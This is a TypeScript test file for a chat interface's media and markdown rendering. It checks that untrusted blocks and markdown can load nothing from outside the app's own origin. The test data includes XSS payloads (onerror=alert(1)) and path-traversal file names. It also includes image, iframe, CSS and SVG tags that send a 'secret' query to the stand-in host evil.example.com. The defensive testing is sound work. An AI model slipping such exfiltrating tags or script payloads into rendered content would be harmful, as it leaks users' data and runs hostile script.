/**
 * SUG-0008 — what a chat message can make the browser load.
 *
 * Refusals first: a media block that is not exactly what the daemon writes is
 * dropped, and rendered markdown loads nothing at all — no image, no video, no
 * CSS. The only picture on screen is a typed block served from the Rooks
 * origin, painted through the `chat.media` slot.
 */
import { strict as assert } from 'node:assert';
import { test } from 'node:test';
import { JSDOM } from 'jsdom';
import { chatMediaUrl, parseGeneratedMedia, parseMediaBlock } from './chat-media';
import { createStreamingMarkdownRenderer, mdToSafeHtml } from './markdown';

const MISSION = '11111111-2222-4333-8444-555555555555';
const PNG_FILE = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee.png';
const WEBM_FILE = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee.webm';
const good = { type: 'media', file: PNG_FILE, kind: 'image', mime: 'image/png', source: 'file' };

test('a block that is not exactly a daemon block is dropped', () => {
  const refused: unknown[] = [
    null, 'media', [], { ...good, type: 'image' },
    { ...good, file: 'https://evil.example.com/p.png' },
    { ...good, file: '../../db.png' },
    { ...good, file: `${PNG_FILE}?x=1` },
    { ...good, file: PNG_FILE.replace('.png', '.svg') },
    { ...good, mime: 'image/svg+xml' },
    { ...good, mime: 'text/html' },
    { ...good, kind: 'video' },
    { ...good, kind: 'iframe' },
    { ...good, source: 'generated' },
    { ...good, source: 'javascript' },
    { ...good, caption: 42 },
    { ...good, caption: 'x'.repeat(301) },
    { ...good, host: 'evil.example.com/<script>' },
    { ...good, host: 'EVIL.example.com' },
  ];
  for (const payload of refused) assert.equal(parseMediaBlock(payload), null, JSON.stringify(payload));
});

test('a daemon block is kept with plain values only', () => {
  assert.deepEqual(parseMediaBlock({ ...good, caption: '<b>cat</b>', host: 'cdn.example.com', extra: '<img>' }), {
    file: PNG_FILE, kind: 'image', mime: 'image/png', source: 'file', caption: '<b>cat</b>', host: 'cdn.example.com',
  });
  assert.equal(parseMediaBlock({ ...good, file: WEBM_FILE, kind: 'video', mime: 'video/webm', source: 'url' })?.kind, 'video');
});

test('generated images: only well-formed raster names', () => {
  assert.deepEqual(
    parseGeneratedMedia([{ file: PNG_FILE, mime: 'image/png' }, { file: '../x.png', mime: 'image/png' }, { file: PNG_FILE, mime: 'image/svg+xml' }, 42]),
    [{ file: PNG_FILE, kind: 'image', mime: 'image/png', source: 'generated' }],
  );
  assert.deepEqual(parseGeneratedMedia('nope'), []);
});

test('the media URL is same-origin and escapes the mission id', () => {
  assert.equal(chatMediaUrl(MISSION, PNG_FILE), `/api/ui/missions/${MISSION}/media/${PNG_FILE}`);
  assert.equal(chatMediaUrl('a/../b', PNG_FILE), `/api/ui/missions/a%2F..%2Fb/media/${PNG_FILE}`);
});

function assertLoadsNothing(html: string) {
  const doc = new JSDOM(`<div>${html}</div>`).window.document;
  assert.equal(doc.querySelectorAll('img, video, audio, source, picture, iframe, object, embed, style, image, link').length, 0, html);
  for (const el of Array.from(doc.querySelectorAll('*'))) {
    for (const attr of Array.from(el.attributes)) {
      assert.ok(!['src', 'srcset', 'poster', 'background', 'style'].includes(attr.name), `${el.tagName} ${attr.name}`);
      assert.doesNotMatch(attr.value, /evil\.example\.com/, `${el.tagName} ${attr.name}`);
    }
  }
  return doc;
}

test('markdown images are never loaded: their caption is shown, marked as not shown', () => {
  const doc = assertLoadsNothing(mdToSafeHtml('![a cat](https://evil.example.com/p.png?secret=1) ![](/home/me/cat.png)', { copyLinks: true }));
  const notes = Array.from(doc.querySelectorAll('.md-image-note')).map((n) => n.textContent);
  assert.equal(notes.length, 2);
  assert.match(notes[0]!, /a cat/);
  assert.doesNotMatch(doc.body.textContent ?? '', /secret/);
});

test('raw HTML cannot load anything either', () => {
  assertLoadsNothing(mdToSafeHtml([
    '<img src="https://evil.example.com/p.png?secret=1" onerror="alert(1)" alt="x">',
    '<img srcset="https://evil.example.com/a.png 1x">',
    '<video src="https://evil.example.com/v.mp4" poster="https://evil.example.com/p.png" autoplay></video>',
    '<audio src="https://evil.example.com/a.mp3" autoplay></audio>',
    '<picture><source srcset="https://evil.example.com/s.png"></picture>',
    '<input type="image" src="https://evil.example.com/i.png">',
    '<table background="https://evil.example.com/t.png"><tr><td>x</td></tr></table>',
    '<div style="background:url(https://evil.example.com/s.png)">styled</div>',
    '<style>body{background:url(https://evil.example.com/b.png)}</style>',
    '<svg><image href="https://evil.example.com/svg.png"/><rect fill="url(https://evil.example.com/f.svg#p)"/></svg>',
    '<iframe src="https://evil.example.com/"></iframe>',
    '<object data="https://evil.example.com/o"></object>',
    '<link rel="stylesheet" href="https://evil.example.com/c.css">',
  ].join('\n\n')));
});

test('the streaming renderer follows the same rule', () => {
  const render = createStreamingMarkdownRenderer();
  const [block] = render('![x](https://evil.example.com/x.png)');
  assertLoadsNothing(block!.html);
  assert.match(block!.html, /md-image-note/);
});

async function mountBlock(block: ReturnType<typeof parseMediaBlock>) {
  const dom = new JSDOM('<div id="root"></div>', { url: 'http://localhost/', pretendToBeVisual: true });
  const install = (key: string, value: unknown) => {
    Object.defineProperty(globalThis, key, { value, configurable: true, writable: true });
  };
  for (const key of ['window', 'document', 'navigator', 'HTMLElement', 'Element', 'Node', 'Event', 'MouseEvent'] as const) {
    install(key, (dom.window as unknown as Record<string, unknown>)[key]);
  }
  install('IS_REACT_ACT_ENVIRONMENT', true);
  const React = await import('react');
  const { createRoot } = await import('react-dom/client');
  const { ChatMediaSlot, ChatMediaCard } = await import('../components/chat/media-block');
  // The product's card is the default occupant mounted by the bundled client
  // half of @rooks/missions (plugins-client/missions.tsx), not by the blocks.
  const { register, resetSlotsForTests } = await import('./plugin-host/slots');
  resetSlotsForTests();
  register({ slot: 'chat.media', pluginId: '@rooks/missions', fallback: true }, ChatMediaCard);
  const root = createRoot(document.getElementById('root')!);
  await React.act(async () => { root.render(React.createElement(ChatMediaSlot, { block: block!, missionId: MISSION })); });
  const unmount = async () => { await React.act(async () => { root.unmount(); }); dom.window.close(); };
  return { document, unmount };
}

test('the product card paints the block from the Rooks origin, caption as text', async () => {
  const block = parseMediaBlock({ ...good, caption: '<img src=x onerror=alert(1)>', source: 'url', host: 'cdn.example.com' });
  const { document: doc, unmount } = await mountBlock(block);
  try {
    const imgs = Array.from(doc.querySelectorAll('img'));
    assert.equal(imgs.length, 1, 'the caption did not become an element');
    assert.equal(imgs[0]!.getAttribute('src'), `/api/ui/missions/${MISSION}/media/${PNG_FILE}`);
    assert.equal(imgs[0]!.getAttribute('referrerpolicy'), 'no-referrer');
    assert.equal(doc.querySelector('.chat-media-caption')?.textContent, '<img src=x onerror=alert(1)>');
    assert.match(doc.querySelector('.chat-media-note')?.textContent ?? '', /cdn\.example\.com/);
    const download = doc.querySelector<HTMLAnchorElement>('a[download]');
    assert.equal(download?.getAttribute('href'), `/api/ui/missions/${MISSION}/media/${PNG_FILE}?download=1`);
    assert.ok(doc.querySelector('button[aria-label]'), 'the preview is a button that enlarges');
  } finally {
    await unmount();
  }
});

test('a video block is a player, not an image', async () => {
  const { document: doc, unmount } = await mountBlock(parseMediaBlock({ ...good, file: WEBM_FILE, kind: 'video', mime: 'video/webm' }));
  try {
    const video = doc.querySelector('video');
    assert.equal(video?.getAttribute('src'), `/api/ui/missions/${MISSION}/media/${WEBM_FILE}`);
    assert.equal(video?.hasAttribute('controls'), true);
    assert.equal(video?.hasAttribute('autoplay'), false);
    assert.equal(doc.querySelectorAll('img').length, 0);
  } finally {
    await unmount();
  }
});
